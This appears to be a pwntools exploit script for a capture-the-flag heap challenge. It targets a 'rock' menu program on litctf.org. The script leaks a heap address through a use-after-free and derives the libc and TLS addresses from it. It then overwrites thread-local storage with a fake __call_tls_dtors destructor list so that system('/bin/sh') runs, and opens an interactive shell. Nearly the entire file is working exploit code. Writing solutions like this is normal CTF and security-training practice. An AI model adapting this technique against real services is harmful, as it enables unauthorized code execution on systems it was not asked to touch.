
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "litctf.org", 31778


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *create+102
b *__call_tls_dtors+61
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./main"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=True)

def debug():
    global gdbscript, pid
    if not args.REMOTE and not args.GDB:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            b *create+102
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='main')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def menu(op):
    sla("> ", str(op))

def create_rock(idx, size):
    menu(1)
    menu(idx)
    menu(size)

def delete_rock(idx):
    menu(2)
    menu(idx)

def view(idx):
    menu(3)
    menu(idx)
    ru("Rock content: ")

def edit_rock(idx, data):
    menu(4)
    menu(idx)
    sa("> ", data)

def exploit():
    global io
    io = initialize()
    create_rock(0, 0x3f8)
    create_rock(1, 0x3f8)
    delete_rock(1)
    view(0)
    heap_leak = u64(rl().strip().ljust(8, b"\x00"))
    if args.DOCKER or args.REMOTE:
        libc.address = heap_leak + 0xf9f8
        tls = libc.address + 0x1ee000
        target = tls + 0x54e8
    else:
        libc.address = heap_leak + 0x119f8
        tls = libc.address + 0x1ee000
        target = tls + 0x5568

    leak("Heap leak", hex(heap_leak))
    leak("Libc base address", hex(libc.address))
    leak("TLS base address", hex(tls))
    leak("Target address", hex(target))
    debug()
    fake_dtor_list =  p64(target+8)
    fake_dtor_list += p64(libc.sym.system << 17)
    fake_dtor_list += p64(next(libc.search(b'/bin/sh')))
    fake_dtor_list += p64(0)*7
    fake_dtor_list += p64(target+0x50)+p64(target+0x50+0x9a0)+p64(target+0x50)
    fake_dtor_list += p64(0)*4
    edit_rock(0, p64(target - 0x4) + b"\n")
    create_rock(2, 0x3f8)
    edit_rock(2, fake_dtor_list + b"\n")
    menu(0)
    io.interactive()

if __name__ == '__main__':
    exploit()
